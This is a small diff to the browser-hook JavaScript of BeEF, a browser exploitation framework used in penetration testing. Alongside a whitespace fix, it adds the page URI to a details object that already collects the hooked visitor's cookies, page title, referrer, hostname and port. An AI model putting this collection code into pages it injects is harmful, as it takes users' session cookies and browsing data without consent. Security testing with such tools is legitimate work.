@@ -407,7 +407,7 @@ beef.browser = {
 		if (this.isFF4())	{ return '4'  };	// Firefox 4
 		if (this.isFF5())	{ return '5'  };	// Firefox 5
 		if (this.isFF6())	{ return '6'  };	// Firefox 6
-		if (this.isFF7())	{ return '7'  };        // Firefox 7
+		if (this.isFF7())	{ return '7'  };	// Firefox 7
 		if (this.isFF8())	{ return '8'  };	// Firefox 8
 		if (this.isFF9())	{ return '9'  };	// Firefox 9
 		if (this.isFF10())	{ return '10' };	// Firefox 10
@@ -648,6 +648,7 @@ beef.browser = {
 		var browser_reported_name = beef.browser.getBrowserReportedName();
 		var cookies = document.cookie;
 		var page_title = (document.title) ? document.title : "No Title";
+		var page_uri = document.location.href;
 		var page_referrer = (document.referrer) ? document.referrer : "No Referrer";
 		var hostname = document.location.hostname;
 		var hostport = (document.location.port)? document.location.port : "80";
@@ -673,6 +674,7 @@ beef.browser = {
 		if(browser_reported_name) details["BrowserReportedName"] = browser_reported_name;
 		if(cookies) details["Cookies"] = cookies;
 		if(page_title) details["PageTitle"] = page_title;
+		if(page_uri) details["PageURI"] = page_uri;
 		if(page_referrer) details["PageReferrer"] = page_referrer;
 		if(hostname) details["HostName"] = hostname;
 		if(hostport) details["HostPort"] = hostport;
